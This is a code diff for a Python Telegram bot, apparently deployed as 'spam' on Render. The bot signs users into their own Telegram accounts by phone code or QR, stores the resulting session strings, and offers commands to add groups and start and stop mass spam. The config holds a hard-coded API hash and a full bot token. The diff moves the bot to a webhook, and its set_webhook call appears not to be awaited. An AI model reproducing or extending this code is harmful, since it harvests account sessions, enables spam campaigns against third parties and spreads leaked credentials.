@@ -4,14 +4,22 @@ import threading
 import time
 import qrcode
 import io
+import logging
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from telethon import TelegramClient, errors
 from telethon.sessions import StringSession
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
-from telegram.error import TimedOut, BadRequest, RetryAfter
+from telegram.error import TimedOut, RetryAfter, Conflict
 
-# ===== КОНФИГ =====
+# === НАСТРОЙКА ЛОГИРОВАНИЯ ===
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO
+)
+logger = logging.getLogger(__name__)
+
+# === КОНФИГ ===
 API_ID = 36474738
 API_HASH = '4dd8134517fc74300fe610a4d385eaa5'
 BOT_TOKEN = '8868463698:AAE2C7pPOdyk7ouT64w_O3LMW-BScIqQSCg'
@@ -20,40 +28,46 @@ BOT_LINK = f"https://t.me/{BOT_USERNAME}"
 SPONSOR_LINK = 'https://t.me/patrickstarsrobot?start=6378686913'
 PHOTO_PATH = 'M.png'
 
+# Получаем URL для вебхука (из переменной окружения Render)
+WEBHOOK_URL = os.environ.get('RENDER_EXTERNAL_URL', 'https://spam-9xnz.onrender.com')
+WEBHOOK_PATH = '/webhook'  # путь, на который Telegram будет слать обновления
+WEBHOOK_PORT = int(os.environ.get('PORT', 8080))
+
 user_data = {}
 active_qr_tasks = {}
 
-# ===== ВЕБ-СЕРВЕР =====
+# ===== ВЕБ-СЕРВЕР ДЛЯ HEALTH CHECKS =====
 class HealthHandler(BaseHTTPRequestHandler):
     def do_GET(self):
-        self.send_response(200)
-        self.send_header('Content-type', 'text/plain')
-        self.end_headers()
-        self.wfile.write(b'Bot is running!')
+        if self.path == '/health' or self.path == '/':
+            self.send_response(200)
+            self.send_header('Content-type', 'text/plain')
+            self.end_headers()
+            self.wfile.write(b'Bot is running!')
+        else:
+            self.send_response(404)
+            self.end_headers()
     def log_message(self, format, *args):
         pass
 
 def run_webserver():
-    port = int(os.environ.get('PORT', 8888))
-    server = HTTPServer(('0.0.0.0', port), HealthHandler)
-    print(f"✅ Веб-сервер запущен на порту {port}")
+    server = HTTPServer(('0.0.0.0', WEBHOOK_PORT), HealthHandler)
+    logger.info(f"Веб-сервер для health checks запущен на порту {WEBHOOK_PORT}")
     server.serve_forever()
 
 # ===== УТИЛИТЫ =====
 def normalize_phone(phone):
-    """Очищает номер телефона от лишних символов, оставляет цифры и +"""
     cleaned = ''.join(ch for ch in phone if ch.isdigit() or ch == '+')
     if not cleaned.startswith('+'):
         cleaned = '+' + cleaned
     return cleaned
 
 async def safe_send_message(context, chat_id, text, parse_mode='Markdown', reply_markup=None):
-    """Надёжная отправка сообщения через context.bot"""
     try:
         await context.bot.send_message(chat_id, text, parse_mode=parse_mode, reply_markup=reply_markup)
         return True
     except Exception as e:
-        print(f"Ошибка отправки сообщения: {e}")
+        logger.error(f"Ошибка отправки сообщения: {e}")
         return False
 
 # ===== ДАННЫЕ ПОЛЬЗОВАТЕЛЕЙ =====
@@ -136,6 +150,7 @@ async def generate_qr_code(user_id):
         img_bytes.seek(0)
         return True, img_bytes, qr_login.url
     except Exception as e:
+        logger.error(f"QR generation error: {e}")
         return False, None, str(e)
 
 async def check_qr_login(user_id, context, chat_id):
@@ -171,7 +186,7 @@ async def check_qr_login(user_id, context, chat_id):
             )
             return False, "PASSWORD_NEEDED"
         except Exception as e:
-            print(f"Ошибка в check_qr_login: {e}")
+            logger.error(f"QR check error: {e}")
             pass
         if await client.is_user_authorized():
             session_string = client.session.save()
@@ -270,7 +285,7 @@ async def send_code_phone(user_id, phone):
         return True, "✅ Код отправлен в Telegram!"
     except errors.FloodWaitError as e:
         wait_min = e.seconds // 60
-        return False, f"⏳ Слишком много попыток. Подождите {wait_min} минут. Используйте QR-код (он не подвержен флуду)."
+        return False, f"⏳ Слишком много попыток. Подождите {wait_min} минут. Используйте QR-код."
     except Exception as e:
         return False, f"❌ Ошибка: {str(e)}"
 
@@ -584,7 +599,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await query.message.delete()
             except:
                 pass
-            # Запускаем проверку с передачей context
             asyncio.create_task(check_qr_status(query, user_id, context))
         else:
             await query.message.reply_text(f"❌ Ошибка: {url}", parse_mode='Markdown')
@@ -812,7 +826,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await show_main_menu(update, context)
             else:
                 if msg == "PASSWORD_NEEDED":
-                    # пароль уже запрошен внутри verify_code_phone, ничего не пишем
                     pass
                 else:
                     await update.message.reply_text(msg)
@@ -927,33 +940,42 @@ def main():
                 if session_string:
                     user = get_user_data(user_id)
                     user['session'] = session_string
-                    print(f"✅ Загружена сессия пользователя {user_id}")
+                    logger.info(f"Загружена сессия пользователя {user_id}")
             except:
                 pass
 
+    # Запускаем веб-сервер для health checks в отдельном потоке
     threading.Thread(target=run_webserver, daemon=True).start()
-    app = Application.builder().token(BOT_TOKEN).build()
 
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("reset", reset))
-    app.add_handler(CommandHandler("help", handle_message))
-    app.add_handler(CommandHandler("add_group", handle_message))
-    app.add_handler(CommandHandler("set_msg", handle_message))
-    app.add_handler(CommandHandler("start_spam", handle_message))
-    app.add_handler(CommandHandler("stop_spam", handle_message))
-    app.add_handler(CommandHandler("status", handle_message))
-    app.add_handler(CommandHandler("groups", handle_message))
-    app.add_handler(CallbackQueryHandler(button_handler))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+    # Создаём приложение
+    application = Application.builder().token(BOT_TOKEN).build()
 
-    print("✅ Бот запущен!")
-    print(f"🔗 Подпись: {BOT_LINK}")
-    if os.path.exists(PHOTO_PATH):
-        print(f"📷 Фото {PHOTO_PATH} будет отправлено с главным меню")
-    else:
-        print(f"⚠️ Фото {PHOTO_PATH} не найдено")
+    # Регистрируем обработчики
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("reset", reset))
+    application.add_handler(CommandHandler("help", handle_message))
+    application.add_handler(CommandHandler("add_group", handle_message))
+    application.add_handler(CommandHandler("set_msg", handle_message))
+    application.add_handler(CommandHandler("start_spam", handle_message))
+    application.add_handler(CommandHandler("stop_spam", handle_message))
+    application.add_handler(CommandHandler("status", handle_message))
+    application.add_handler(CommandHandler("groups", handle_message))
+    application.add_handler(CallbackQueryHandler(button_handler))
+    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
 
-    app.run_polling()
+    # Устанавливаем вебхук
+    webhook_url = f"{WEBHOOK_URL}{WEBHOOK_PATH}"
+    logger.info(f"Установка вебхука на {webhook_url}")
+    application.bot.set_webhook(url=webhook_url)
+
+    # Запускаем приложение с вебхуком
+    logger.info("Бот запущен с вебхуком")
+    application.run_webhook(
+        listen='0.0.0.0',
+        port=WEBHOOK_PORT,
+        url_path=WEBHOOK_PATH,
+        webhook_url=webhook_url,
+    )
 
 if __name__ == "__main__":
     main()
